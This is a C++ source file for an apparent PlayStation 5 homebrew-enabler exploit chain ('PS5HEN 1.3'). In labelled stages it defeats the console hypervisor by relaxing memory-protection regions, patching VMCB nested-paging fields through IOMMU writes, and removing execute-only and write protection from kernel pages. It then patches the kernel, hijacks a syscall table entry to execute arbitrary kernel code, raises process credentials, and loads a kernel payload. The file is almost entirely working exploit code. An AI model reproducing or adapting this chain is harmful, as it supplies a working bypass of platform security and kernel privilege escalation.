#include <sys/types.h>
#include <sys/syscall.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <cstdio>
#include <fcntl.h>
#include <sys/cpuset.h>
#include <signal.h>
#include <setjmp.h>

extern "C" int cpuset(cpusetid_t *);

#include "hv_defeat.h"
#include "util.h"
#include "gpu_dma.h"
#include "iommu.h"
#include "patches.h"

#define print(fmt, ...) printf(fmt, ##__VA_ARGS__)

int stage0_discover(hv_defeat_ctx *ctx) {
    print("\n[stage0] discovery\n");

    ctx->fw = kernel_get_fw_version() >> 16;
    g_fw() = ctx->fw;

    if (!fw_supported(ctx->fw)) {
        print("  fw 0x%04x not supported\n", ctx->fw);
        return -1;
    }

    ctx->kbase = (uint64_t)KERNEL_ADDRESS_DATA_BASE - fw_off(ctx->fw, "KDATA_OFFSET");

    uint64_t kdata = KERNEL_ADDRESS_DATA_BASE;
    uint64_t ktext = KERNEL_ADDRESS_TEXT_BASE;

    int32_t ml4i = (int32_t)kr4(ctx->kbase + fw_off(ctx->fw, "OFF_DMPML4I"));
    int32_t dpi  = (int32_t)kr4(ctx->kbase + fw_off(ctx->fw, "OFF_DMPDPI"));
    ctx->dmap_base = ((uint64_t)dpi << 30) | ((uint64_t)ml4i << 39) | 0xFFFF800000000000ULL;

    ctx->hv_data_va = (uint64_t)KERNEL_ADDRESS_TEXT_BASE + fw_off(ctx->fw, "KERNEL_TEXT_SIZE");

    print("  kbase     0x%lx\n", ctx->kbase);
    print("  dmap      0x%lx\n", ctx->dmap_base);
    print("  hv_data   0x%lx\n", ctx->hv_data_va);
    print("  fw        0x%04x\n", ctx->fw);
    print("  kdata 0x%lx ktext 0x%lx\n", kdata, ktext);

    if ((uint32_t)dr4(ctx->dmap_base, ECAM_B0D18F2) != 0xFFFFFFFF) {
        for (int t = 0; t < 22; t++) {
            uint32_t b = tmr_read(ctx->dmap_base, TMR_BASE(t));
            uint32_t l = tmr_read(ctx->dmap_base, TMR_LIMIT(t));
            uint32_t c = tmr_read(ctx->dmap_base, TMR_CONFIG(t));
            if (c == 0 && b == 0 && l == 0) continue;
            //print("  tmr[%2d] 0x%012lx-0x%012lx cfg=0x%08x\n",
            //    t, (uint64_t)b << 16, ((uint64_t)l << 16) | 0xFFFFULL, c);
        }
    }
    return 0;
}

static int tmr_relax_for_pa(uint64_t dmap, uint64_t pa,
                            uint32_t *saved, int *count) {
    uint32_t pa16 = (uint32_t)(pa >> 16);
    for (int i = MAX_TMR - 1; i >= 0; i--) {
        if (i == 19 || i == 20) continue;
        uint32_t b = tmr_read(dmap, TMR_BASE(i));
        uint32_t l = tmr_read(dmap, TMR_LIMIT(i));
        uint32_t c = tmr_read(dmap, TMR_CONFIG(i));
        if ((c & 1) == 0 || pa16 < b || pa16 > l) continue;

        if (*count < MAX_SAVED_TMRS) {
            saved[*count * 2] = (uint32_t)i;
            saved[*count * 2 + 1] = c;
            (*count)++;
        }
        tmr_write(dmap, TMR_CONFIG(i), TMR_CFG_PERMISSIVE);
        uint32_t v = tmr_read(dmap, TMR_CONFIG(i));
        print("  tmr[%d] 0x%08x -> 0x%08x%s\n", i, c, v,
            (v == TMR_CFG_PERMISSIVE) ? "" : " FAIL");
        if (v != TMR_CFG_PERMISSIVE) return -1;
    }
    return 0;
}

int stage1_tmr_relax(hv_defeat_ctx *ctx) {
    print("\n[stage1] tmr patching\n");
    if ((uint32_t)dr4(ctx->dmap_base, ECAM_B0D18F2) == 0xFFFFFFFF) return -1;
    if (ctx->fw >= 0x0500) { 
        print("  patched on 5.00+\n"); 
        return -2; 
    }

    ctx->saved_tmr_count = 0;
    uint64_t kpa = (uint64_t)tmr_read(ctx->dmap_base, TMR_BASE(16)) << 16;

    int ret = tmr_relax_for_pa(ctx->dmap_base, kpa, ctx->saved_tmrs, &ctx->saved_tmr_count);
    if (ret) return ret;

    if (ctx->fw >= 0x0300) {
        uint32_t t17 = tmr_read(ctx->dmap_base, TMR_BASE(17));
        if (t17) {
            ret = tmr_relax_for_pa(ctx->dmap_base, (uint64_t)t17 << 16,
                                   ctx->saved_tmrs, &ctx->saved_tmr_count);
            if (ret) return ret;
        }
    }

    ctx->tmr_disabled = 1;
    print("  %d tmrs modified\n", ctx->saved_tmr_count);
    return 0;
}

uint64_t get_vmcb (hv_defeat_ctx *ctx, int core) {

    uint32_t tmr16_base = tmr_read(ctx->dmap_base, TMR_BASE(16));
    tmr16_base = tmr16_base << 16;

    switch (ctx->fw) {
        case 0x0300:
        case 0x0310:
        case 0x0320:
        case 0x0321:
            return (uint64_t) 0x6290B000 + (uint64_t) core * 0x3000;
            break;
        case 0x0400:
        case 0x0402:
        case 0x0403:
        case 0x0450:
        case 0x0451:
            return (uint64_t) 0x62A05000 + (uint64_t) core * 0x3000;
            break;
        default:
            return -1;
    }
}

int stage2_find_vmcbs(hv_defeat_ctx *ctx) 
{
    print("\n[stage2] vmcb discovery\n");

    uint64_t vcpu_off = fw_off(ctx->fw, "HV_VCPU");
    uint64_t stride   = fw_off(ctx->fw, "HV_VCPU_CPUID");
    
    if ((!vcpu_off || !stride) && ctx->fw < 0x0300) {
        print("  missing HV_VCPU offsets for fw 0x%04x\n", ctx->fw);
        return -1;
    }

    uint64_t hv_data_pa;
    if (ctx->fw >= 0x0300) {
        // fw 3.00+: HV is separate, PA from TMR17
        uint32_t t17 = tmr_read(ctx->dmap_base, TMR_BASE(17));
        if (!t17) {
            print("  tmr17 base is 0, can't find HV region\n");
            return -1;
        }
        hv_data_pa = (uint64_t)t17 << 16;
        print("  hv separate, pa=0x%lx (from tmr17)\n", hv_data_pa);
    } else {
        // fw < 3.00: HV embedded after kernel text
        uint64_t ktext_pa = (uint64_t)tmr_read(ctx->dmap_base, TMR_BASE(16)) << 16;
        hv_data_pa = ktext_pa + fw_off(ctx->fw, "KERNEL_TEXT_SIZE");
        print("  hv embedded, pa=0x%lx\n", hv_data_pa);
    }
    ctx->hv_data_pa = hv_data_pa;

    ctx->vmcb_count = 0;
    for (int c = 0; c < 16; c++) {
        uint64_t vmcb_pa;

        if (ctx->fw < 0x0300) {
            // FW 1.xx/2.xx: read VMCB pointer from per-CPU struct via GPU
            uint64_t ptr_pa = hv_data_pa + vcpu_off + (uint64_t)c * stride;
            uint64_t vmcb_va = gpu_read_phys8(ptr_pa);
            if ((vmcb_va >> 32) != 0xFFFFFFFF || (vmcb_va & 0xFFF) != 0) {
                print("  core %2d: bad vmcb_va 0x%lx\n", c, vmcb_va);
                return -2;
            }
            vmcb_pa = pmap_kextract(vmcb_va);
        } else {
            // FW 3.xx/4.xx: deterministic from SEV pool
            vmcb_pa = get_vmcb(ctx, c);
        }

        print("  core %2d: pa=0x%lx\n", c, vmcb_pa);

        if (ctx->vmcb_count < MAX_VMCBS) {
            ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
            ctx->vmcb_count++;
        }
    }
    
    print("  %d vmcbs\n", ctx->vmcb_count);

    return ctx->vmcb_count == 0 ? -2 : 0;
}

int iommu_selftest(iommu_ctx *iommu, uint64_t dmap) {
    print("\n[iommu] self-test\n");

    uint64_t scratch = 0xAAAAAAAABBBBBBBBULL;
    uint64_t scratch_pa = pmap_kextract((uint64_t)&scratch);

    if (!scratch_pa || scratch_pa >= 0x100000000ULL) {
        print("  bad scratch PA 0x%lx\n", scratch_pa);
        return -1;
    }

    uint64_t pattern = 0xDEADCAFE12345678ULL;
    print("  scratch pa=0x%lx before=0x%016lx\n", scratch_pa, scratch);

    iommu_write8_pa(iommu, scratch_pa, pattern);
    uint64_t readback = kr8(dmap + scratch_pa);

    print("  wrote=0x%016lx read=0x%016lx %s\n",
        pattern, readback, (readback == pattern) ? "OK" : "FAIL");

    return (readback == pattern) ? 0 : -1;
}

int stage3_patch_vmcbs(hv_defeat_ctx *ctx, iommu_ctx *iommu) {
    print("\n[stage3-iommu] vmcb patch via IOMMU\n");
    if (ctx->vmcb_count == 0) return -1;

    int cur = sceKernelGetCurrentCpu();
    pin_to_core(cur);

    for (int i = 0; i < ctx->vmcb_count; i++) {
        uint64_t pa = ctx->vmcb_pas[i];

        //iommu_write8_pa(iommu, pa + 0x00, 0x0000000000000000ULL);
        //iommu_write8_pa(iommu, pa + 0x08, 0x0004000000000000ULL);
        //iommu_write8_pa(iommu, pa + 0x10, 0x000000000000000FULL);
        //iommu_write8_pa(iommu, pa + 0x58, 0x0000000000000001ULL);
        iommu_write8_pa(iommu, pa + 0x90, 0x0000000000000000ULL);

        print("  vmcb[%2d] patched (pa=0x%lx)\n", i, pa);
    }

    pin_to_core(9);

    ctx->vmcbs_patched = 1;
    print("  done, %d cores\n", ctx->vmcb_count);
    return 0;
}

int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
    print("\n[stage3b] xotext removal\n");

    pin_to_first_available_core();

    uint64_t pmap = ctx->kbase + fw_off(ctx->fw, "OFF_PMAP_STORE");
    uint64_t read_2 = 0;
    kernel_copyout(pmap, &read_2, sizeof(read_2));
    kernel_copyout(pmap + fw_off(ctx->fw, "PMAP_PM_PML4"), &read_2, 8);
	
    uint64_t start = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
    uint64_t end = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
    int n = 0;

    for (uint64_t a = start; a < end; a += 0x1000) {
        uint64_t pde, pde_a = find_pde(pmap, a, &pde);
        if (pde_a != ~0ULL) {
            CLEAR_PDE_BIT(pde, XOTEXT); SET_PDE_BIT(pde, RW);
            kernel_copyin(&pde, pde_a, sizeof(pde));
            uint64_t read = 0;
            kernel_copyout(pde_a, &read, sizeof(read));
						
        }
        uint64_t pte, pte_a = find_pte(pmap, a, &pte);
        if (pte_a != ~0ULL) {
            CLEAR_PDE_BIT(pte, XOTEXT); SET_PDE_BIT(pte, RW);
            kernel_copyin(&pte, pte_a, sizeof(pte));
            uint64_t read3 = 0;
            kernel_copyout(pte_a, &read3, sizeof(read3));
        }
        n++;
    }
    print("  %d pages on ktext\n", n);

    start = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
    end = (uint64_t)KERNEL_ADDRESS_DATA_BASE + 0x08000000;
    for (uint64_t a = start; a < end; a += 0x1000) {
        uint64_t pde, pde_a = find_pde(pmap, a, &pde);
        if (pde_a != ~0ULL) {
            SET_PDE_BIT(pde, RW);
            kernel_copyin(&pde, pde_a, sizeof(pde));
            uint64_t read = 0;
            kernel_copyout(pde_a, &read, sizeof(read));
        }
        uint64_t pte, pte_a = find_pte(pmap, a, &pte);
        if (pte_a != ~0ULL) {
            SET_PDE_BIT(pte, RW);
            kernel_copyin(&pte, pte_a, sizeof(pte));
            uint64_t read3 = 0;
            kernel_copyout(pte_a, &read3, sizeof(read3));
        }
        n++;
    }
    print("  %d pages on kdata\n", n);
    return 0;
}

int stage4_verify(hv_defeat_ctx *ctx) {
    print("\n[stage4] verify\n");

    uint64_t ktext = kr8((uint64_t)KERNEL_ADDRESS_TEXT_BASE);
    uint64_t hvdata = kr8(ctx->hv_data_va);
    uint32_t np = ctx->vmcb_count > 0 ? (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_NP_ENABLE) : 0xFF;

    print("  ktext  0x%016lx%s\n", ktext, (ktext != 0 && ktext != ~0ULL) ? " ok" : " fail");
    print("  hvdata 0x%016lx%s\n", hvdata, (hvdata != ~0ULL) ? " ok" : " fail");
    print("  np     0x%x%s\n", np, ((np & 0x9) == 0) ? " ok" : " fail");

    // verify intercepts persisted on vmcb[0]	 
    if (ctx->vmcb_count > 0) {
        uint32_t cr  = (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_INTERCEPT_CR);
        uint32_t exc = (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_INTERCEPT_EXC);
        uint32_t g1  = (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_INTERCEPT_MISC);
        uint32_t g2  = (uint32_t)dr4(ctx->dmap_base, ctx->vmcb_pas[0] + VMCB_INTERCEPT_VMXX);
        print("  vmcb0  cr=0x%x exc=0x%x g1=0x%x g2=0x%x%s\n",
            cr, exc, g1, g2, (cr == 0 && exc == 0 && g1 == 0) ? " ok" : " REVERTED");
    }
    return 0;
}

static int widen_cpuset_syscall() {
    cpusetid_t new_id;
    int ret = cpuset(&new_id);
    if (ret) {
        print("  cpuset() failed: ret=%d errno=%d\n", ret, errno);
        return -1;
    }
    print("  cpuset() new_id=%d\n", new_id);
    cpuset_t mask;
    CPU_ZERO(&mask);
    mask.__bits[0] = 0xFFFF;

    ret = cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_CPUSET, new_id, 0x8, &mask);
    if (ret) {
        print("  cpuset_setaffinity() failed: ret=%d errno=%d\n", ret, errno);
        return -1;
    }
    return 0;
}

[[maybe_unused]] static int clear_smap_smep_nda(hv_defeat_ctx *ctx) {
    print("\n[smap/smep/nda] clearing on all cores\n");

    uint8_t gadget[] = {
        // clear SMAP (bit 21) + SMEP (bit 20) in CR4
        0x0F, 0x20, 0xE0,                          // mov rax, cr4
        0x48, 0x25, 0xFF, 0xFF, 0xCF, 0xFF,        // and rax, ~(3<<20)
        0x0F, 0x22, 0xE0,                          // mov cr4, rax
        // clear NDA (bit 16) in EFER MSR
        0xB9, 0x80, 0x00, 0x00, 0xC0,              // mov ecx, 0xC0000080
        0x0F, 0x32,                                 // rdmsr
        0x25, 0xFF, 0xFF, 0xFE, 0xFF,              // and eax, ~(1<<16)
        0x0F, 0x30,                                 // wrmsr
        0xC3                                        // ret
    };

    uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
    uint64_t gadget_va = ktext + fw_off(ctx->fw, "KERNEL_OFF_CODE_CAVE") + 0x20000;

    print("[clear_smap_smep_nda] before kernel_copyin into ktext code cave\n");

    kernel_copyin(gadget, gadget_va, sizeof(gadget));
    int done = 0;
    for (int i = 0; i < 16; i++) {
        if (pin_to_core(i) == 0) {
            kexec(gadget_va);
            done++;
        }
    }
    unpin();
    print("  cleared on %d/16 cores\n", done);
    return 0;
}

int stage5_patch_kernel(hv_defeat_ctx *ctx) {
    print("\n[stage5] kernel patches\n");

    uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;

    auto pit = fw_patches.find(ctx->fw);
    if (pit == fw_patches.end() || pit->second.empty()) {
        print("  no patches for fw 0x%04x\n", ctx->fw);
        return 0;
    }

    int n = 0;
    int skipped = 0;
    for (auto &p : pit->second) {
        if (!p.offset || !p.bytes || !p.len) {
            print("  skipping unresolved patch %s\n", p.name ? p.name : "<unnamed>");
            skipped++;
            continue;
        }

        uint64_t va = ktext + p.offset;
        uint64_t pa = pmap_kextract(va);
        if (pa && pa < 0x100000000ULL) {
            kernel_copyin(p.bytes, va, p.len);
            n++;
        }
    }
    print("  %d patches applied", n);
    if (skipped) {
        print(", %d skipped", skipped);
    }
    print("\n");

    return 0;
}

int stage6_install_kexec(hv_defeat_ctx *ctx) {
    print("\n[stage6] kexec\n");

    uint64_t ppr = fw_off(ctx->fw, "PPR_SYSENT");
    uint64_t gadget = fw_off(ctx->fw, "GADGET_JMP_PTR_RSI");
    if (!ppr || !gadget) {
        print("  missing offsets\n");
        return -1;
    }

    uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
    uint64_t entry_va = ktext + ppr + 0x11 * sizeof(struct sysent);
    uint64_t entry_pa = pmap_kextract(entry_va);
    uint64_t jmp = ktext + gadget;

    print("  sysent va=0x%lx pa=0x%lx\n", entry_va, entry_pa);

    if (!entry_pa || entry_pa > 0x100000000ULL) {
        print("  bad sysent PA\n");
        return -1;
    }

    kw4(entry_va + offsetof(sysent, n_arg),     2);
    kw8(entry_va + offsetof(sysent, sy_call),  jmp);
    kw4(entry_va + offsetof(sysent, sy_flags),  0);
    kw4(entry_va + offsetof(sysent, sy_thrcnt), 1);

    uint64_t v = kr8(entry_va + offsetof(sysent, sy_call));
    print("  sysent[0x11].sy_call = 0x%lx%s\n", v, (v == jmp) ? " ok" : " fail");

    return (v == jmp) ? 0 : -1;
}

int kexec(uint64_t fptr) {
    return syscall(0x11, fptr,
        kernel_get_fw_version() & 0xFFFF0000,
        (uint64_t)KERNEL_ADDRESS_TEXT_BASE);
}

extern "C" {
    extern uint8_t KELF[];
    extern uint64_t KELF_SZ;
}

static int stage7_restore_npts(hv_defeat_ctx *ctx, iommu_ctx *iommu) {
    printf("\n[stage7] NPTs - Remove XO, set RW and reenable them\n");

    // Read CR3 from VM0, all VMs share the same paging
    uint64_t NPT_CR3 = kr8(get_dmap_addr(ctx->vmcb_pas[0]+0xB0));

    // Remove XO & Enable RW
    walk_pages_and_set_RW(0, NPT_CR3);

    // Restore NPT bit on VMs
    for (int i=0 ; i<16 ; i++) {
        uint64_t pa = ctx->vmcb_pas[i];
        iommu_write8_pa(iommu, pa + 0x90, 0x0000000000000009ULL);
        printf("  vmcb[%2d] NPT restored\n", i);
        usleep(100);
    }
    return 0;
}

int stage8_run_hen(hv_defeat_ctx *ctx) {
    print("\n[stage8] hen\n");

    uint64_t cave = fw_off(ctx->fw, "KERNEL_OFF_CODE_CAVE");
    if (!cave) {
        print("  missing code cave offset\n");
        return -1;
    }

    uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
    uint64_t dest = ktext + cave;

    uint64_t sz = KELF_SZ;
    uint64_t dest_pa = pmap_kextract(dest);
    if (!dest_pa || dest_pa > 0x100000000ULL) {
        print("  bad code cave PA\n");
        return -1;
    }

    print("  copying %lu bytes to va=0x%lx (pa=0x%lx)\n", sz, dest, dest_pa);

    constexpr uint32_t CHUNK = 0x1000;
    uint64_t written = 0;
    while (written < sz) {
        uint32_t n = (sz - written > CHUNK) ? CHUNK : (uint32_t)(sz - written);
        kernel_copyin(&KELF[written], dest + written, n);
        written += n;
    }

    print("  copied %lu bytes\n", sz);

    int ret = kexec(dest);
    print("  kexec returned 0x%x\n", ret);

    return ret;
}

static void flush_vms(void) {
    static jmp_buf jmp_env;
    static volatile int vmmcall_faulted;

    auto old_handler = signal(SIGILL, [](int) {
        vmmcall_faulted = 1;
        longjmp(jmp_env, 1);
    });

    for (int i = 0; i < 16; i++) {
        pin_to_core(i);
        vmmcall_faulted = 0;

        if (setjmp(jmp_env) == 0) {
            asm volatile("vmmcall");
        }

        print("[vmmcall] core: %2d %s\n", i,
            vmmcall_faulted ? "SIGILL (caught)" : "ok");
    }

    signal(SIGILL, old_handler);
}

int run_hv_defeat(void) {
    hv_defeat_ctx ctx;
    memset(&ctx, 0, sizeof(ctx));

    int r;

    if ((r = stage0_discover(&ctx))) return r;

    kernel_set_ucred_authid(getpid(), 0x4800000000000007);

    if (widen_cpuset_syscall() != 0)
        print("  cpuset widen failed\n");

    // init GPU DMA
    gpu_kernel_offsets go = {};
    go.proc_vmspace = KERNEL_OFFSET_PROC_P_VMSPACE;
    go.vmspace_vm_vmid = fw_off(ctx.fw, "VMSPACE_VM_VMID");
    go.sizeof_gvmspace = ctx.fw < 0x0200 ? 0xF8 : 0x100;
    go.gvmspace_page_dir_va = 0x38;
    go.gvmspace_size = 0x10;
    go.gvmspace_start_va = 0x08;
    go.data_base_gvmspace = fw_off(ctx.fw, "DATA_BASE_GVMSPACE");

    gpu_set_offsets(&go);
    if ((r = gpu_init())) return r;

    if ((r = stage1_tmr_relax(&ctx))) return r;

    iommu_ctx iommu;
    if ((r = iommu_init(&iommu, ctx.dmap_base, ctx.kbase, ctx.fw))) {
        print("[iommu] init failed (%d), falling back to GPU DMA\n", r);
    }

    if (r == 0 && (r = iommu_selftest(&iommu, ctx.dmap_base))) {
        print("[iommu] self-test failed\n");
    }

    if ((r = stage2_find_vmcbs(&ctx))) return r;

    if ((r = stage3_patch_vmcbs(&ctx, &iommu))) return r;
   
    if ((r = stage3b_remove_xotext(&ctx))) return r;

    flush_vms();

    kernel_pmap_invalidate_all();

    stage4_verify(&ctx);

    stage5_patch_kernel(&ctx);

    if ((r = stage6_install_kexec(&ctx))) return r;

    //clear_smap_smep_nda(&ctx);

    stage7_restore_npts(&ctx, &iommu);

    flush_vms();

    stage8_run_hen(&ctx);

    uint32_t fw_ver = kernel_get_fw_version();
    uint32_t fw_major = (fw_ver & 0xFF000000) >> 24;
    uint32_t fw_minor = (fw_ver & 0x00FF0000) >> 16;

    char notify_msg[128];
    snprintf(notify_msg, sizeof(notify_msg),
             "Welcome To PS5HEN 1.3\nPlayStation 5 FW: %d.%02X\nBy SpecterDev, f0f, flat_z",
             fw_major, fw_minor);

    notify(notify_msg);

    return 0;
}



// Credits: idlesauce
// does pmap_invalidate_all(kernel_pmap)
// on 4.03, pmap_pcid_enabled and invpcid_works are both 0 - it seems zen 2 doesnt support INVPCID
// so this will do invltlb_glob invalidating all tlb caches, including global entries, on all cores
int kernel_pmap_invalidate_all(void) {
	
	
    print("[stage3c] invalidate paging entries\n");
	
    static uint64_t two_zero_pages[PAGE_SIZE * 2] = {0};

    int pipe_fds[2];
    // set O_NONBLOCK to avoid PIPE_DIRECTW
    if (pipe2(pipe_fds, O_NONBLOCK)) {
        return -1;
    }

    // the pipe starts off as 1 page large - we need to write into the pipe so it will grow to BIG_PIPE_SIZE
    // we need to make sure pmap_invalidate_all doesnt use the one page fast path
    if (write(pipe_fds[1], two_zero_pages, PAGE_SIZE * 2) < 0) {
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        return -1;
    }

    // dont need this anymore
    close(pipe_fds[1]);

    uint64_t read_fd_file_data = kernel_get_proc_file(-1, pipe_fds[0]);

    // for (uint64_t i=0; i<0x40; i=i+8) {
    //     uint64_t read_val;
    //     kernel_copyout(read_fd_file_data + i, &read_val, sizeof(read_val));
    //     std::print("Read value at add 0x{:016x} : 0x{:016x}\n", read_fd_file_data + i, read_val);
    // }

    // std::print("This is read_fd_file_data: {:016x}\n", read_fd_file_data);
    if (!INKERNEL(read_fd_file_data)) {
        close(pipe_fds[0]);
        return -1;
    }

    uint64_t read_fd_buffer;
    kernel_copyout(read_fd_file_data + 0x10, &read_fd_buffer, sizeof(read_fd_buffer));
    // std::print("This isread_fd_buffer: {:016x}\n", read_fd_buffer);
    if (!INKERNEL(read_fd_buffer)) {
        close(pipe_fds[0]);
        return -1;
    }

    // inside pmap_remove anyvalid has to be 1 for pmap_invalidate_all to be called
    // anyvalid is only set if there is at least 1 non global entry being removed
    // set the first entry as non global, its being removed anyway so its fine (?)
    if (!page_remove_global(read_fd_buffer)) {
        close(pipe_fds[0]);
        return -1;
    }

    // fd 0 is read end, it holds the buffer, this close is what does the pmap_invalidate_all
    // because pmap == kernel_pmap, it will do invltlb_glob
    close(pipe_fds[0]);
    return 0;
}